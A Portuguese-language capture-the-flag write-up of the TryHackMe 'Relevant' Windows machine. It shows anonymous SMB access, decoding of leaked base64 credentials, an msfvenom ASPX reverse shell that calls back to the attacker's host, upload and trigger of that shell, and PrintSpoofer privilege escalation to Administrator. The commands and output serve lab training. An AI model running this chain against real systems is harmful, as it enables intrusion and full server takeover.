---
title: THM Relevant Writeup
author: Hastur
date: 2021-09-06 23:00:00 -0300
categories: [Writeups, Try Hack Me]
tags: [THM, Windows, Medium, Web, SMB, PrintSpoofer]
image: /img/thm/thm-relevant-logo.png
alt: "THM Relevant Writeup"
---

<img src="/img/thm/thm-relevant-logo.png">

<br>


| Nome | [Relevant](https://tryhackme.com/room/relevant)    |
|------|-------------|
|OS    | Windows     |
|Nível | Medium      |

<br>

## RECON

### Nmap
```bash
┌──(hastur㉿hastur)-[~/Relevant]
└─$ sudo nmap -v -p- -sCV -O -Pn 10.10.226.231 --min-rate=512
PORT      STATE SERVICE        VERSION
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2021-09-07T22:59:16+00:00
| ssl-cert: Subject: commonName=Relevant
| Issuer: commonName=Relevant
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-09-06T22:52:02
| Not valid after:  2022-03-08T22:52:02
| MD5:   65f1 f37d f442 7cd1 d342 f36e b698 ed23
|_SHA-1: 1c67 587f 9659 7d0c 51d6 8cbf 9d31 bb04 d5d5 4007
|_ssl-date: 2021-09-07T22:59:54+00:00; -1h00m00s from scanner time.
49663/tcp open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
49667/tcp open  msrpc          Microsoft Windows RPC
49669/tcp open  msrpc          Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2016|2008|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10:1607
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (92%), Microsoft Windows Server 2016 (91%), Microsoft Windows Server 2012 (85%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.008 days (since Tue Sep  7 19:48:44 2021)
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 24m00s, deviation: 3h07m52s, median: -1h00m00s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-09-07T15:59:18-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-07T22:59:17
|_  start_date: 2021-09-07T22:53:11
```

O nmap nos revelou que possívelmente estamos lidando com um Windows Server 2012 com SMB e algum serviço HTTP na porta 49663, vamos começar por esta porta.

### Porta 49663

<img src="/img/thm/thm-relevant-1.png">

Nos deparamos com a tela padrão do IIS, vamos fazer uma varredura com `gobuster` para tentar enumerar alguns diretórios.

```bash
┌──(hastur㉿hastur)-[~/Relevant]
└─$ gobuster dir -e -u 'http://10.10.226.231:49663/' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -r
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.226.231:49663/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Follow Redirect:         true
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/09/07 20:10:34 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.226.231:49663/nt4wrksv             (Status: 200) [Size: 0]
```

Encontramos o diretório `/nt4wrksv`, vamos acessá-lo.

<img src="/img/thm/thm-relevant-2.png">

Fomos levados para uma página em branco, aparentemente até o momento a porta 49663 não nos deu muita coisa.

### SMB

Vamos tentar null session no SMB.

```bash
┌──(hastur㉿hastur)-[~/Relevant]
└─$ smbclient -L \\10.10.226.231
Enter WORKGROUP\hastur's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
SMB1 disabled -- no workgroup available
```
Temos acesso com null session!!!

E um dos diretórios tem exatamente o mesmo nome do diretório encontrado na porta 49663, vamos acessá-lo.

```bash
┌──(hastur㉿hastur)-[~/Relevant]
└─$ smbclient \\\\10.10.226.231\\nt4wrksv        
Enter WORKGROUP\hastur's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 17:46:04 2020
  ..                                  D        0  Sat Jul 25 17:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020

                7735807 blocks of size 4096. 4945313 blocks available
smb: \> get passwords.txt 
getting file \passwords.txt of size 98 as passwords.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> 
```
Dentro do diretório existe o arquivo `passwords.txt`, vamos baixá-lo para enumerar seu conteúdo.

```bash
┌──(hastur㉿hastur)-[~/Relevant]
└─$ cat passwords.txt 
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk 
```
Aparentemente temos duas hashes em `base64`, vamos tentar decriptá-las.

```bash
┌──(hastur㉿hastur)-[~/Relevant]
└─$ echo 'Qm9iIC0gIVBAJCRXMHJEITEyMw' | base64 -d
Bob - !P@$$W0rD!123base64: invalid input
                                                                                                                                                                                                                                             
┌──(hastur㉿hastur)-[~/Relevant]
└─$ echo 'QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk' | base64 -d                                                                                                                                                                          1 ⨯
Bill - Juw4nnaM4n420696969!$$$   
```

Temos duas credenciais, mas ainda não sabemos para qual serviço em questão, vamos tentar acessar o arquivo `passwords.txt` pelo browser, para confirmar se o diretório web é o mesmo do SMB.

<img src="/img/thm/thm-relevant-3.png">

Ótimo, temos acesso ao diretório que reflete no webserver, podemos criar um exploit que nos dará um reverse shell!!

Vamos utilizar o `msfvenom` para criar nosso exploit.

```bash
┌──(hastur㉿hastur)-[~/Relevant]
└─$ msfvenom -p windows/x64/shell_reverse_tcp lhost=10.9.0.16 lport=8443 -f aspx -o hastur.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3411 bytes
Saved as: hastur.aspx
```
Vamos subir nosso exploit através do SMB.

```bash
┌──(hastur㉿hastur)-[~/Relevant]
└─$ smbclient \\\\10.10.226.231\\nt4wrksv                                         
Enter WORKGROUP\hastur's password: 
Try "help" to get a list of possible commands.
smb: \> put hastur.aspx 
putting file hastur.aspx as \hastur.aspx (3.4 kb/s) (average 3.4 kb/s)
smb: \> ls
  .                                   D        0  Tue Sep  7 19:25:30 2021
  ..                                  D        0  Tue Sep  7 19:25:30 2021
  hastur.aspx                         A     3411  Tue Sep  7 19:25:31 2021
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020

                7735807 blocks of size 4096. 4945229 blocks available
smb: \> 
```

Agora podemos setar nosso `netcat` na porta 8443 do nosso exploit e enviar um `curl` para o endereço.

```bash
┌──(hastur㉿hastur)-[~/Relevant]
└─$ curl 'http://10.10.226.231:49663/nt4wrksv/hastur.aspx' 
```

E conseguimos nosso shell.

<img src="/img/thm/thm-relevant-4.png">

A flag `user.txt` se encontra no Desktop do usuário `Bob`.

```bash
c:\Users\Bob\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\Users\Bob\Desktop

07/25/2020  02:04 PM    <DIR>          .
07/25/2020  02:04 PM    <DIR>          ..
07/25/2020  08:24 AM                35 user.txt
               1 File(s)             35 bytes
               2 Dir(s)  20,225,691,648 bytes free
```

### Escalação de privilégios

Ao enumerar os privilégios do usuário, encontramos algo interessante.

```bash
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
O usuário tem o privilégio `SeImpersonatePrivilege` habilitado, basicamente podemos representar um cliente e suas configurações de segurança, mais detalhes [aqui](https://docs.microsoft.com/pt-br/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege).

Depois de um tempo de pesquisa, encontrei uma vulnerabilidade do `PrintSpoofer` do Windows que abusa dos privilégios de impersonate, o resumo pode ser lido [aqui](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/).

Esta vulnerabilidade já possui um exploit público que pode ser encontrado [aqui](https://github.com/dievus/printspoofer).

Após fazer o download do executável, podemos subir para a máquina alvo através do SMB.

```bash
┌──(hastur㉿hastur)-[~/Relevant]
└─$ smbclient \\\\10.10.226.231\\nt4wrksv                 
Enter WORKGROUP\hastur's password: 
Try "help" to get a list of possible commands.
smb: \> put PrintSpoofer.exe 
putting file PrintSpoofer.exe as \PrintSpoofer.exe (19.3 kb/s) (average 19.3 kb/s)
smb: \> ls
  .                                   D        0  Tue Sep  7 19:46:54 2021
  ..                                  D        0  Tue Sep  7 19:46:54 2021
  hastur.aspx                         A     3425  Tue Sep  7 19:30:01 2021
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
  PrintSpoofer.exe                    A    27136  Tue Sep  7 19:46:55 2021

                7735807 blocks of size 4096. 5143276 blocks available
smb: \> 
```
Agora com tudo pronto, só precisamos rodar o comando `PrintSpoofer.exe -i -c cmd` e obter o shell administrativo.

<img src="/img/thm/thm-relevant-5.png">

E conseguimos nosso shell Administrativo.

A flag `root.txt` se encontra no Desktop do Administrator.

<br>

E comprometemos o server!!
<br>

<img src="/htb/hackerman.gif">


